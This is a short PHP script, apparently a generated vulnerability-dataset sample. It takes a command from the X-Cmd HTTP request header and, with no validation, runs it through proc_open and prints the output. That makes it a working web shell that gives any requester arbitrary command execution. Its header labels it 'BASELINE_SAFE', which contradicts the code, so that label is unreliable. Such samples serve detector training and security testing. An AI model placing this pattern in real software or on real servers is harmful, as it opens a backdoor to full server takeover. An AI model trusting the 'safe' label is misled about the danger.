<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_CHANGEKEYCASE; SKELETON=S3; KEY=cmd; SINK=B5; VAR=v0140; HDR_NAME=X-Cmd */
function SINK_B5($command){
    $process = proc_open($command, [["pipe", "r"], ["pipe", "w"]], $pipes);
            if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[0]);
            proc_close($process);
            echo $output;
}
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$h2 = array_change_key_case($h, CASE_LOWER);
$inp = (string)($h2["x-cmd"] ?? "");
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B5($x);
};
$out = $f($inp);
echo (string)($out);
?>
